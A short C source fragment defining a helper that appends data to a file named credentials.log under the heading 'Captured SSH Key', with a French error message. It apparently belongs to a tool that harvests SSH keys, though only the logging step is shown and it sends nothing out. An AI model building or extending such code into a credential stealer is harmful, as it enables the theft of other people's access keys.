#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void log_credentials(const char *data) {
    FILE *file = fopen("credentials.log", "a");
    if (file == NULL) {
        perror("[log_credentials] Erreur lors de l'ouverture du fichier");
        return;
    }
    fprintf(file, "Captured SSH Key:\n%s\n", data);
    fclose(file);
}

